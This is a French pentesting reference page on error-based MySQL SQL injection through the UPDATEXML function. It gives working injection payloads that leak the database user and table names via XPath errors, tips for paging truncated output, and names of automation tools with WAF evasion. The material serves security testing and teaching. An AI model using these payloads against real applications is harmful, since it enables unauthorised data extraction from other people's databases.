---
title: "Injection MySQL error-based avec UPDATEXML"
description: "Faire fuiter les résultats de requêtes MySQL via des erreurs de syntaxe XPath levées par la fonction à trois arguments UPDATEXML, avec la même troncature à 32 caractères qu'EXTRACTVALUE."
keywords:
  - UPDATEXML
  - erreur de syntaxe XPath
  - injection error-based
  - fuite de données MySQL
---

# UPDATEXML

`UPDATEXML(xml_target, xpath_expression, new_value)` remplace une partie d'un document XML sélectionnée par une expression XPath. Comme `EXTRACTVALUE`, elle rejette un argument XPath invalide avec `XPATH syntax error: '<text>'` et renvoie le texte, donc c'est le second canal d'erreur fiable dans MySQL. Elle est pratique quand `EXTRACTVALUE` est filtré mais pas `UPDATEXML`.

Placez l'expression qui fuit dans le second argument, préfixée de `~` pour qu'elle soit un XPath invalide. Les premier et troisième arguments peuvent être n'importe quelles valeurs valides :

```sql
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),1)-- 
```

L'erreur retourne `XPATH syntax error: '~root@localhost'`. Remplacez par n'importe quelle sous-requête à valeur unique :

```sql
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1)),1)-- 
```

La même troncature à ~32 caractères s'applique, donc paginez les valeurs longues avec `SUBSTRING` exactement comme avec `EXTRACTVALUE`, et gardez la requête interne à une seule ligne.

## Outils

- **sqlmap** : extraction error-based automatisée via les fonctions XPath.
- **ghauri** : alternative rapide avec forte évasion des WAF.

## Références

- MySQL Reference Manual: UPDATEXML, XPath functions
- OWASP Testing Guide: Testing for SQL Injection
